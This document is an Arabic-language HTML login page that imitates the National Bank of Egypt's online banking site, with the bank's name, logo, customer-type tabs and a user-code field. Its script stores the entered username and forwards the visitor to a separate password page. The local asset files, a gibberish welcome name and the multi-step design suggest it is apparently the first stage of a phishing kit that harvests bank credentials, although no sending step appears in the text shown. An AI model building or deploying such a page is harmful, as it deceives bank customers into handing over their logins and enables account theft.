<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البنك الأهلي المصري - تسجيل الدخول</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="login-theme.css">
</head>
<body>

<header class="site-header">
    <div class="header-left">
        <div class="menu-btn"><i class="fas fa-bars"></i></div>
        <a href="login_en.html" class="lang-switcher">
            <span>English</span>
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
        </a>
    </div>
    <div class="header-right">
        <img src="static_nbe_logo_full.png" alt="البنك الأهلي المصري">
    </div>
</header>

<main class="login-shell">
    <div class="login-card-container">
        <div class="card-logo">
            <img src="static_nbe_logo_full.png" alt="البنك الأهلي المصري">
        </div>

        <div class="user-types">
            <div class="type-card">
                <i class="fas fa-building"></i>
                <span>شركات</span>
            </div>
            <div class="type-card active">
                <i class="far fa-user"></i>
                <span>أفراد</span>
            </div>
        </div>

        <div class="welcome-msg">أهلاً بك يا <span>lgguhfuughuy</span></div>
        <h1 class="page-heading">كود المستخدم</h1>

        <section class="login-card">
            <div id="errorMessage" role="alert"></div>
            <form id="step1Form">
                <div class="form-group">
                    <label class="form-label">كود المستخدم</label>
                    <div class="form-control-wrapper">
                        <input type="text" id="username" name="username" class="form-control" placeholder="كود المستخدم" required autofocus>
                    </div>
                </div>
                <a href="#" class="forgot-link">نسيت كود المستخدم؟</a>
                
                <button type="submit" class="submit-btn">تسجيل الدخول</button>
            </form>
        </section>

        <div class="register-section">
            <a href="#" class="register-title">سجل الآن</a>
            <p class="register-text">انضم إلى عملاء البنك الأهلي المصري</p>
        </div>
    </div>
</main>

<script>
document.getElementById('step1Form').addEventListener('submit', function(event) {
    event.preventDefault();
    const username = document.getElementById('username').value;
    if (username) {
        localStorage.setItem('temp_username', username);
        window.location.href = 'password.html';
    }
});
</script>
</body>
</html>
